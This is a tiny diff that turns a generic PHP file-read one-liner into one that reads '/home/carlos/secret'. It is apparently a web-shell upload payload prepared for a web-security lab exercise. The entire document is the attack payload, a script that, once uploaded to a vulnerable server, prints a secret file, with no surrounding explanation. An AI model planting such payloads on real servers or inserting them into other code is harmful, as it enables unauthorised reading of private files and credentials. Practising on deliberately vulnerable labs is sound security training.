@@ -1,1 +1,1 @@
-<?php echo file\_get\_contents('/path/to/target/file'); ?>
+<?php echo file_get_contents('/home/carlos/secret'); ?>
